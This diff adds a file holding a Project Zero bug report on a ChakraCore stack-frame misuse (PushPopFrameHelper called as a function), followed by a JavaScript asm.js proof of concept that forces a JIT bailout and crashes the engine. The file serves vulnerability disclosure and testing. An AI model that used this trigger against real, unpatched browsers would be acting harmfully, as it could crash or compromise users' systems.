@@ -1,0 +1,46 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1277
+
+PushPopFrameHelper is a class that pushes the current stack frame object in its constructor and pops it in the destructor. So it should be used like "PushPopFrameHelper holder(...)", but InterpreterStackFrame::ProcessLinkFailedAsmJsModule uses it like a function.
+
+Var InterpreterStackFrame::ProcessLinkFailedAsmJsModule()
+{
+    ...
+    PushPopFrameHelper(newInstance, _ReturnAddress(), _AddressOfReturnAddress());
+    ...
+}
+
+It pushes "newInstance" and immediately pop it.
+
+The PoC will crash in the following code.
+void BailOutRecord::ScheduleLoopBodyCodeGen(Js::ScriptFunction * function, Js::ScriptFunction * innerMostInlinee, BailOutRecord const * bailOutRecord, IR::BailOutKind bailOutKind)
+{
+    ...
+    Js::InterpreterStackFrame * interpreterFrame = executeFunction->GetScriptContext()->GetThreadContext()->GetLeafInterpreterFrame(); <<-- Invalid stack frame object
+    loopHeader = executeFunction->GetLoopHeader(interpreterFrame->GetCurrentLoopNum()); <<-- interpreterFrame->GetCurrentLoopNum() == -1
+    ...
+}
+
+
+PoC:
+-->
+
+function asmModule() {
+    'use asm';
+
+    let a = [1, 2, 3, 4];
+    for (let i = 0; i < 0x100000; i++) {  // JIT
+        a[0] = 1;
+        if (i === 0x30000) {
+            a[0] = {};  // the array type changed, bailout!!
+        }
+    }
+
+    function f(v) {
+        v = v | 0;
+        return v | 0;
+    }
+    return f;
+}
+
+asmModule(1);
